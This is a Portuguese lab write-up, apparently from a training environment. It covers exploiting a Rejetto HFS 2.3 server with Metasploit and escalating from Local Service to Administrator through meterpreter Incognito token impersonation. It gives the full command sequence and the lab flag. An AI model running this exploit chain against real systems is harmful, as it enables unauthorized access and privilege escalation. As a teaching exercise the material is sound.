
## Objetivo

Explorar um servidor **Rejetto HFS 2.3**, obter acesso inicial e realizar **privilege escalation** usando **token impersonation** para ler a flag do usuário Administrator.

---

## Reconhecimento

Primeiro foi realizado um scan básico com Nmap para identificar portas abertas.

```bash
nmap demo.ine.local
```

Resultado:

- múltiplas portas abertas
    
- porta **80/tcp** identificada como interessante
    

---

## Enumeração de Versão

Foi realizado scan específico na porta 80 para identificar versão do serviço:

```bash
nmap -sV -p 80 demo.ine.local
```

Foi identificado:

- Serviço HTTP
    
- Rodando **Rejetto HFS 2.3**
    
- Versão conhecida com vulnerabilidade RCE
    

---

## Busca por Exploit

Foi usado searchsploit para encontrar exploit disponível:

```bash
searchsploit hfs
```

Resultado:

- Exploit disponível para **Rejetto HFS 2.3**
    
- Módulo Metasploit disponível
    

---

## Exploração com Metasploit

Inicialização do Metasploit:

```bash
msfconsole -q
```

Uso do módulo de exploit:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Configuração do alvo:

```bash
set RHOSTS demo.ine.local
```

Execução do exploit:

```bash
exploit
```

Após execução, foi obtida sessão meterpreter.

Verificação do usuário atual:

```bash
getuid
```

Resultado:

- sessão rodando como **Local Service**
    
- acesso limitado
    
- necessário privilege escalation
    

---

## Tentativa de Acesso à Flag

A flag estava localizada em:

```
C:\Users\Administrator\Desktop\flag.txt
```

Tentativa de leitura:

```bash
cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

Resultado:

- acesso negado
    
- privilégio insuficiente
    

---

## Privilege Escalation — Incognito

Carregamento do plugin incognito:

```bash
load incognito
```

Listagem de tokens disponíveis:

```bash
list_tokens -u
```

Foi identificado:

- Token disponível do usuário **Administrator**
    

---

## Token Impersonation

Impersonação do token:

```bash
impersonate_token ATTACKDEFENSE\\Administrator
```

Verificação do novo usuário:

```bash
getuid
```

Resultado:

- sessão agora como **Administrator**
    

---

## Leitura da Flag

```bash
cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

Flag obtida:

```
x28c832a39730b7d46d6c38f1ea18e12
```

---

## Conceitos Importantes

### Rejetto HFS Vulnerability

- HTTP File Server 2.3 possui RCE
    
- Permite execução remota de comandos
    
- Exploração direta via Metasploit
    

### Token Impersonation

- Processo assume token de outro usuário
    
- Necessita token disponível na memória
    
- Não requer senha
    
- Técnica comum de privilege escalation
    

### Incognito

Plugin do meterpreter usado para:

- listar tokens
    
- impersonar usuários
    
- privilege escalation
    

---

## Fluxo do Ataque

1. Scan com Nmap
    
2. Identificação do serviço vulnerável
    
3. Busca de exploit
    
4. Exploração com Metasploit
    
5. Obtenção de shell (Local Service)
    
6. Falha ao acessar recurso privilegiado
    
7. Enumeração de tokens
    
8. Impersonação do Administrator
    
9. Leitura da flag
    

---

## Pontos-Chave para Revisão

- Nmap para enumeração inicial
    
- searchsploit para encontrar exploits
    
- Metasploit para exploração rápida
    
- Meterpreter para pós-exploração
    
- Incognito para privilege escalation
    
- Token impersonation sem senha
    

---

## Comandos Resumo

```bash
nmap demo.ine.local
nmap -sV -p 80 demo.ine.local
searchsploit hfs

msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
getuid

load incognito
list_tokens -u
impersonate_token ATTACKDEFENSE\\Administrator
getuid

cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

---

## Resumo Rápido

Foi explorado um servidor Rejetto HFS 2.3 vulnerável via Metasploit. Após obter acesso como Local Service, foi utilizado o plugin Incognito para enumerar tokens disponíveis. O token do Administrator foi impersonado, permitindo privilege escalation e leitura da flag.

---